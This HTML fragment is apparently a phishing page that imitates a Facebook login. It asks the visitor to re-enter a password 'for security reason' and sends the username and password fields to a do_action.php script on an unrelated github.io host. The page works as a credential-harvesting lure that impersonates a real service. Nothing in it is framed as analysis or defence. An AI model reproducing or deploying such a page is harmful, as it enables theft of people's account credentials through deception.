	...
	<section>
		<div class="form">
			...
			<div class="red-box">
				...
				<p>Enter your passwor for security reason </p>
				<p>Forgot your password ? <a href="">Request new one</a>
			</div>

			<div class="login-form">
				<form action="https://atamunim1.github.io/facebookfun/do_action.php" Method ="Post">
					<label for="username">Username:</label>
					<input name="username" type="text" id="username"></input><br /><br />
					<label for="password">Password:</label>
					<input name="password" id="password" type="password"></input><br />
					<input id="keep" style="margin: 10px 0 0 54px" type="checkbox"></input>
					<label for="keep" style="font-size:12px;">keep me logged in</label><br />
					<input type="submit" name="submit" value="Login" style="background: none repeat scroll 0 0 #3b5998; border: 6px solid #3b5998; color: #ffffff; margin: 4px 0 0 80px; padding: 2px 6px;"></input>
